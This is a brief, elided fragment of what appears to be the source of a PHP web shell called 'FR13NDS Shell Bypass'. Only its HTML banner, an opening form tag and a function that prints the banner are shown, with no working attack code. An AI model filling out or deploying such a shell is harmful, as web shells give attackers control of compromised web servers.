...
<html>
  ...
  <title>FR13NDS Shell</title>
</head>
<body>
  <br></br>
  <center><h1>FR13NDS Shell Bypass !! </h1></center>
</body>
<form method="post">
...
function author() {
	echo "<center><br>FR13NDS Shell Bypass</center>";
	exit();
}
